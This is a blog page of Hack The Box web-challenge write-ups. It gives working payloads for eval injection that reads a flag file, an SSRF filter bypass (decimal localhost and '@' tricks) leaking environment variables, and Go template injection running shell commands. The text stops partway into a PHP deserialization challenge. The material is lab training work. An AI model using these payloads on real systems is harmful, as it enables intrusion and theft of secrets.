<!DOCTYPE html><html><head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes">
  
  
  <title>  HTB Web Challenge |   Ikonw Blog </title>

 
  
    <link rel="icon" href="/images/avatar.jpg">
  


  
<link rel="stylesheet" href="/nayo.min.css">
 
<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Ikonw" type="application/atom+xml">
</head>  
  <body>   
    
      <header class="header-wrapper">
  <nav class="inner">
    <div class="title">
      <a href="/">
        <img class="logo" src="/images/logo.png">
      </a>
    </div>

    <ul class="menu">
      <li class="item">
        <a class="link" id="menu-home" href="/"> <!-- Home -->
          <i class="iconfont icon-home"></i>
        </a>
      </li>
      <li class="item">
        <a class="link" id="menu-archives" href="/archives"> <!-- Archives -->
          <i class="iconfont icon-archives"></i>
        </a>
      </li>
      <li class="item">
        <a class="link" id="menu-tags" href="/tags"> <!-- Tags -->
          <i class="iconfont icon-tags"></i>
        </a>
      </li>
      <li class="item">
        <a class="link" id="menu-about" href="/about"> <!-- About -->
          <i class="iconfont icon-about"></i>
        </a>
      </li>
      <li class="item">
        <a class="link" id="menu-search"> <!-- Search -->
          <i class="iconfont icon-search"></i>
        </a>
      </li>
    </ul>
  </nav>
</header>


<header class="mobile-header-wrapper">
  <i id="mobile-toggle" class="iconfont icon-menu mobile-toggle"></i>
</header>   

      <div class="container">       
          
          
            <div class="container-inner">  
          

          <article class="post slideDownMin">
  
	
<div class="header">
		<p class="title">	
			HTB Web Challenge
		</p>
		<div class="info">	
			<time>
				Jan 01, 1998
			</time>

			
			
				<i class="iconfont icon-words"></i>
				<span class="words">12151
				</span>
			
		</div>
</div> 
	

    <script type="text/x-mathjax-config">
        var post = document.getElementsByClassName("post")[0];  
        MathJax.Hub.Config({
            showProcessingMessages: false,
            messageStyle: "none",    
            tex2jax: {
                inlineMath:  [ ["$", "$"] , ["\\(","\\)"]],
                displayMath: [ ["$$","$$"] , ["\\[","\\]"]],
                skipTags: ['script', 'noscript', 'style', 'textarea', 'pre','code','a'],
            },
            "HTML-CSS": {            
                showMathMenu: false
            }
        });
        MathJax.Hub.Queue(["Typeset",MathJax.Hub,post]);
    </script>
    <style>.MathJax{outline:0;}</style>

    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.2/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
 

	  <div class="typo post-content ">

		

			
					<h1 id="Jscalc-Easy"><a href="#Jscalc-Easy" class="headerlink" title="Jscalc - Easy"></a>Jscalc - Easy</h1><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
<p>In the mysterious depths of the digital sea, a specialized JavaScript calculator has been crafted by tech-savvy squids. With multiple arms and complex problem-solving skills, these cephalopod engineers use it for everything from inkjet trajectory calculations to deep-sea math. Attempt to outsmart it at your own risk! ü¶ë</p>
</blockquote>
<p>Poking through the website found it uses <code>eval()</code>, in this case, it is vulnerable directly execute javascript codes</p>
<p><img src="/images/HTB-Web-Challenge/image-20231211110203037.png"></p>
<p>Take a look at routes, the <code>/api/calculate</code> accept variable called ‚Äò<code>formula</code>‚Äò and passed it to the <code>calculatorHelp</code> calculator for processing</p>
<figure class="highlight js"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> path       = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> express    = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> router     = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Calculator</span> = <span class="built_in">require</span>(<span class="string">'../helpers/calculatorHelper'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">response</span> = data =&gt; ({ <span class="attr">message</span>: data });</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">'/'</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">	<span class="keyword">return</span> res.<span class="title function_">sendFile</span>(path.<span class="title function_">resolve</span>(<span class="string">'views/index.html'</span>));</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">'/api/calculate'</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">	<span class="keyword">let</span> { formula } = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (formula) {</span><br><span class="line">		result = <span class="title class_">Calculator</span>.<span class="title function_">calculate</span>(formula);</span><br><span class="line">		<span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="title function_">response</span>(result));</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="title function_">response</span>(<span class="string">'Missing parameters'</span>));</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ocd</span></span><br></pre></td></tr></tbody></table></figure>

<p>and it directly proceed with <code>eval</code> without sanitized the input</p>
<figure class="highlight plaintext"><figcaption><span>js</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">module.exports = {</span><br><span class="line">    calculate(formula) {</span><br><span class="line">        try {</span><br><span class="line">            return eval(`(function() { return ${ formula } ;}())`);</span><br><span class="line"></span><br><span class="line">        } catch (e) {</span><br><span class="line">            if (e instanceof SyntaxError) {</span><br><span class="line">                return 'Something went wrong!';</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p><a target="_blank" rel="noopener" href="https://nodejs.org/en/learn/manipulating-files/reading-files-with-nodejs">Reading files with Node.js</a></p>
<p><code>readFileSync</code> can be used to read files.</p>
<p>craft payload in one line would be </p>
<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">'fs'</span>).<span class="title function_">readFileSync</span>(<span class="string">'../flag.txt'</span>)</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/HTB-Web-Challenge/image-20231211110904318.png"></p>
<p>However it seems to return an object.</p>
<p>Modify the parameter for readFileSync to <code>utf8</code></p>
<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">'fs'</span>).<span class="title function_">readFileSync</span>(<span class="string">'../flag.txt'</span>,<span class="string">'utf8'</span>)</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/HTB-Web-Challenge/image-20231211111035521.png"></p>
<h1 id="ProxyAsService-Easy"><a href="#ProxyAsService-Easy" class="headerlink" title="ProxyAsService  - Easy"></a>ProxyAsService  - Easy</h1><p><strong>app.py</strong></p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">app.register_blueprint(proxy_api, url_prefix=<span class="string">'/'</span>)</span><br><span class="line">app.register_blueprint(debug, url_prefix=<span class="string">'/debug'</span>)</span><br></pre></td></tr></tbody></table></figure>

<p>2 route blueprint <code>proxy_api</code> and <code>debug</code></p>
<figure class="highlight elm"><table><tbody><tr><td class="code"><pre><span class="line"><span class="title">ip</span>:<span class="keyword">port</span>/(proxy_api)</span><br><span class="line">ip:<span class="keyword">port</span>/debug(debug)</span><br></pre></td></tr></tbody></table></figure>

<p><strong>route.py</strong></p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint, request, Response, jsonify, redirect, url_for</span><br><span class="line"><span class="keyword">from</span> application.util <span class="keyword">import</span> is_from_localhost, proxy_req</span><br><span class="line"><span class="keyword">import</span> random, os</span><br><span class="line"></span><br><span class="line">SITE_NAME = <span class="string">'reddit.com'</span></span><br><span class="line"></span><br><span class="line">proxy_api = Blueprint(<span class="string">'proxy_api'</span>, __name__)</span><br><span class="line">debug     = Blueprint(<span class="string">'debug'</span>, __name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@proxy_api.route(<span class="params"><span class="string">'/'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>():</span><br><span class="line">    url = request.args.get(<span class="string">'url'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        cat_meme_subreddits = [</span><br><span class="line">            <span class="string">'/r/cats/'</span>,</span><br><span class="line">            <span class="string">'/r/catpictures'</span>,</span><br><span class="line">            <span class="string">'/r/catvideos/'</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        random_subreddit = random.choice(cat_meme_subreddits)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'.proxy'</span>, url=random_subreddit))</span><br><span class="line">    </span><br><span class="line">    target_url = <span class="string">f'http://<span class="subst">{SITE_NAME}</span><span class="subst">{url}</span>'</span></span><br><span class="line">    response, headers = proxy_req(target_url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Response(response.content, response.status_code, headers.items())</span><br><span class="line"></span><br><span class="line"><span class="meta">@debug.route(<span class="params"><span class="string">'/environment'</span>, methods=[<span class="string">'GET'</span>]</span>)</span></span><br><span class="line"><span class="meta">@is_from_localhost</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug_environment</span>():</span><br><span class="line">    environment_info = {</span><br><span class="line">        <span class="string">'Environment variables'</span>: <span class="built_in">dict</span>(os.environ),</span><br><span class="line">        <span class="string">'Request headers'</span>: <span class="built_in">dict</span>(request.headers)</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(environment_info)</span><br></pre></td></tr></tbody></table></figure>

<p>Break down into 2 parts.</p>
<p>in the default index route, if the <code>url</code> parameter is not provided in the request, it will be randomly assign a path to <code>reddits</code>.</p>
<p>If the <code>url</code> is set in parameter, it will access the url through the <code>proxy_req</code> function</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">@proxy_api.route(<span class="params"><span class="string">'/'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>():</span><br><span class="line">    url = request.args.get(<span class="string">'url'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        cat_meme_subreddits = [</span><br><span class="line">            <span class="string">'/r/cats/'</span>,</span><br><span class="line">            <span class="string">'/r/catpictures'</span>,</span><br><span class="line">            <span class="string">'/r/catvideos/'</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        random_subreddit = random.choice(cat_meme_subreddits)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'.proxy'</span>, url=random_subreddit))</span><br><span class="line">    </span><br><span class="line">    target_url = <span class="string">f'http://<span class="subst">{SITE_NAME}</span><span class="subst">{url}</span>'</span></span><br><span class="line">    response, headers = proxy_req(target_url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Response(response.content, response.status_code, headers.items())</span><br></pre></td></tr></tbody></table></figure>

<p><strong>utils.py</strong></p>
<p>In this <code>utils.py</code> states the restriction for <code>proxy_req</code> functions stated previously, it will check if the <code>url</code> parameter contains the restricted keywords in the <code>RESTIRCTED_URLS</code> list. It will then act as a proxy send a request and forward the response back to user.</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">RESTRICTED_URLS = [<span class="string">'localhost'</span>, <span class="string">'127.'</span>, <span class="string">'192.168.'</span>, <span class="string">'10.'</span>, <span class="string">'172.'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_safe_url</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">for</span> restricted_url <span class="keyword">in</span> RESTRICTED_URLS:</span><br><span class="line">        <span class="keyword">if</span> restricted_url <span class="keyword">in</span> url:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_from_localhost</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @functools.wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_ip</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> request.remote_addr != <span class="string">'127.0.0.1'</span>:</span><br><span class="line">            <span class="keyword">return</span> abort(<span class="number">403</span>)</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> check_ip</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy_req</span>(<span class="params">url</span>):    </span><br><span class="line">    method = request.method</span><br><span class="line">    headers =  {</span><br><span class="line">        key: value <span class="keyword">for</span> key, value <span class="keyword">in</span> request.headers <span class="keyword">if</span> key.lower() <span class="keyword">in</span> [<span class="string">'x-csrf-token'</span>, <span class="string">'cookie'</span>, <span class="string">'referer'</span>]</span><br><span class="line">    }</span><br><span class="line">    data = request.get_data()</span><br><span class="line"></span><br><span class="line">    response = requests.request(</span><br><span class="line">        method,</span><br><span class="line">        url,</span><br><span class="line">        headers=headers,</span><br><span class="line">        data=data,</span><br><span class="line">        verify=<span class="literal">False</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_safe_url(url) <span class="keyword">or</span> <span class="keyword">not</span> is_safe_url(response.url):</span><br><span class="line">        <span class="keyword">return</span> abort(<span class="number">403</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> response, headers</span><br></pre></td></tr></tbody></table></figure>

<p>From here, it clearly seems a <code>SSRF</code> challenge. But where is the flag?</p>
<p>Checking through the docker files, the flag is hiding in the environment variable. Which we can obtain through the second part of the debug endpoints</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">@debug.route(<span class="params"><span class="string">'/environment'</span>, methods=[<span class="string">'GET'</span>]</span>)</span></span><br><span class="line"><span class="meta">@is_from_localhost</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug_environment</span>():</span><br><span class="line">    environment_info = {</span><br><span class="line">        <span class="string">'Environment variables'</span>: <span class="built_in">dict</span>(os.environ),</span><br><span class="line">        <span class="string">'Request headers'</span>: <span class="built_in">dict</span>(request.headers)</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(environment_info)</span><br></pre></td></tr></tbody></table></figure>

<p>It has to check if the request if is from localhost</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_from_localhost</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @functools.wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_ip</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> request.remote_addr != <span class="string">'127.0.0.1'</span>:</span><br><span class="line">            <span class="keyword">return</span> abort(<span class="number">403</span>)</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> check_ip</span><br></pre></td></tr></tbody></table></figure>

<p>Now the task seems clearer, we have to craft a SSRF attacks, targeted to the <code>/debug/environment</code> and leak the environment settings that contains the flag.</p>
<p>Firstly, we have to bypass the restriction of <code>RESTRICTED_LIST</code>, it can be easily bypass by using decimal to represent IP address. <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass#localhost">Hacktrick</a> also provided other methods that represent <code>localhost</code></p>
<p>Secondly, we cannot directly input the url point to endpoint as it will embedded a <code>reddit</code> infront of our provided user input.</p>
<p>Therefore we can use @ to bypass that.</p>
<p>Therefore the full payload will be </p>
<figure class="highlight elixir"><table><tbody><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span>//&lt;ip&gt;<span class="symbol">:&lt;port&gt;</span>?url=<span class="variable">@2130706433</span><span class="symbol">:&lt;port&gt;/debug/environment</span></span><br></pre></td></tr></tbody></table></figure>

<p>The server side will interpreted as</p>
<figure class="highlight elixir"><table><tbody><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span>//&lt;ip&gt;<span class="symbol">:&lt;port&gt;</span>?url=reddit<span class="variable">@2130706433</span><span class="symbol">:&lt;port&gt;/debug/environment</span></span><br></pre></td></tr></tbody></table></figure>

<p>However, one interesting thing is when I setup docker in my localhost.</p>
<p><img src="/images/HTB-Web-Challenge/image-20231211142253717.png"></p>
<p>I am able to get the flag through the payload indicate the port to be 1337 (Which docker itself exposed to 1337)</p>
<figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">172.17.0.1:1337</span>/?url=@<span class="number">2130706433</span>:<span class="number">1337</span>/debug/environment</span><br></pre></td></tr></tbody></table></figure>

<p>but to the real target, I have difficulties using the same port 32436.</p>
<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20231211142411053.png" class="lazyload"></p>
<p>Suspect it is a mapping of ports when expose to public IPs.</p>
<p>Therefore have to change the payload to port 1337</p>
<figure class="highlight ruby"><table><tbody><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/159.65.24.125:32436/</span><span class="string">?u</span>rl=<span class="variable">@0</span>.<span class="number">0.0</span>.<span class="number">0</span><span class="symbol">:</span><span class="number">1337</span>/debug/environment</span><br></pre></td></tr></tbody></table></figure>


<h1 id="RenderQuest-Easy"><a href="#RenderQuest-Easy" class="headerlink" title="RenderQuest  - Easy"></a>RenderQuest  - Easy</h1><blockquote>
<p>You‚Äôve found a website that lets you input remote templates for rendering. Your task is to exploit this system‚Äôs vulnerabilities to access and retrieve a hidden flag. Good luck!</p>
</blockquote>
<p>From the description it seems like a Server Side Template Injection.</p>
<p>In function <code>getTpl</code></p>
<p>It retrieve the page and render the page using html template.</p>
<p><a target="_blank" rel="noopener" href="https://pkg.go.dev/html/template">https://pkg.go.dev/html/template</a></p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p RequestData)</span></span> FetchServerInfo(command <span class="type">string</span>) <span class="type">string</span> {</span><br><span class="line">	out, err := exec.Command(<span class="string">"sh"</span>, <span class="string">"-c"</span>, command).Output()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">		</span><br></pre></td></tr></tbody></table></figure>

<p>This function is able to execute system information. Finding a way to trigger this function.</p>
<p>It looks complicated, but we can always use chatGPT to spawn a sample html page with the go lang template.</p>
<figure class="highlight handlebars"><table><tbody><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="comment">&lt;!-- File name: index.tpl --&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Sample Template<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Welcome!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>This is a sample GoLang HTML template page.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="comment">&lt;!-- Here, you can include Go template syntax to render dynamic content --&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Client IP: </span><span class="template-variable">{{<span class="name">.ClientIP</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>User Agent: </span><span class="template-variable">{{<span class="name">.ClientUA</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Server Hostname: </span><span class="template-variable">{{<span class="name">.ServerInfo.Hostname</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Server OS: </span><span class="template-variable">{{<span class="name">.ServerInfo.OS</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Server Kernel Version: </span><span class="template-variable">{{<span class="name">.ServerInfo.KernelVersion</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Server Memory: </span><span class="template-variable">{{<span class="name">.ServerInfo.Memory</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Location Information:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>IP Version: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.IpVersion</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>IP Address: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.IpAddress</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Latitude: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.Latitude</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Longitude: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.Longitude</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Country Name: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.CountryName</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Country Code: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.CountryCode</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Time Zone: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.TimeZone</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Zip Code: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.ZipCode</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>City Name: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.CityName</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Region Name: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.RegionName</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Continent: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.Continent</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Continent Code: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.ContinentCode</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure>

<p>Using web hook, paste the html template into the response.</p>
<p>Great we can render the page.</p>
<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20231224212844990.png" class="lazyload"></p>
<p>Next we can just edit to call the <code>FetchServerInfo</code> </p>
<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20231224223755102.png" class="lazyload"></p>
<p>and we got the result</p>
<figure class="highlight tap"><table><tbody><tr><td class="code"><pre><span class="line">total 10172</span><br><span class="line">drwxr-xr-x   <span class="number"> 1 </span>root     root         <span class="number"> 4096 </span>Dec<span class="number"> 17 </span>12:54 .</span><br><span class="line">drwxr-xr-x   <span class="number"> 1 </span>root     root         <span class="number"> 4096 </span>Dec<span class="number"> 17 </span>12:54 ..</span><br><span class="line">-rw-r--r--   <span class="number"> 1 </span>root     root         <span class="number"> 4786 </span>Sep<span class="number"> 11 </span>14:11 main.go</span><br><span class="line">-rwxr-xr-x   <span class="number"> 1 </span>root     root     <span class="number"> 10387927 </span>Dec<span class="number"> 17 </span>12:54 renderquest</span><br><span class="line">drwxr-xr-x   <span class="number"> 4 </span>root     root         <span class="number"> 4096 </span>Sep <span class="number"> 7 </span>23:12 static</span><br><span class="line">drwxr-xr-x   <span class="number"> 2 </span>root     root         <span class="number"> 4096 </span>Sep <span class="number"> 7 </span>23:12 templates</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20231224224419354.png" class="lazyload"></p>
<h1 id="Toxic-Easy"><a href="#Toxic-Easy" class="headerlink" title="Toxic - Easy"></a>Toxic - Easy</h1><blockquote>
<p>Humanity has exploited our allies, the dart frogs, for far too long, take back the freedom of our lovely poisonous friends. Malicious input is out of the question when dart frogs meet industrialisation. üê∏</p>
</blockquote>
<p>In index.php</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">'PHPSESSID'</span>]))</span><br><span class="line">{</span><br><span class="line">    <span class="variable">$page</span> = <span class="keyword">new</span> <span class="title class_">PageModel</span>;</span><br><span class="line">    <span class="variable">$page</span>-&gt;file = <span class="string">'/www/index.html'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(</span><br><span class="line">        <span class="string">'PHPSESSID'</span>, </span><br><span class="line">        <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$page</span>)), </span><br><span class="line">        <span class="title function_ invoke__">time</span>()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>, </span><br><span class="line">        <span class="string">'/'</span></span><br><span class="line">    );</span><br><span class="line">} </span><br><span class="line"></span><br><span class="line"><span class="variable">$cookie</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">'PHPSESSID'</span>]);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$cookie</span>);</span><br></pre></td></tr></tbody></table></figure>

<p>The page is deserialize the cookie to render the page.</p>
<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20231231204239161.png" class="lazyload"></p>
<p>The url file page being render is being indicate in the file attribute.</p>
<p>Below is the breakdown of the seralized object </p>
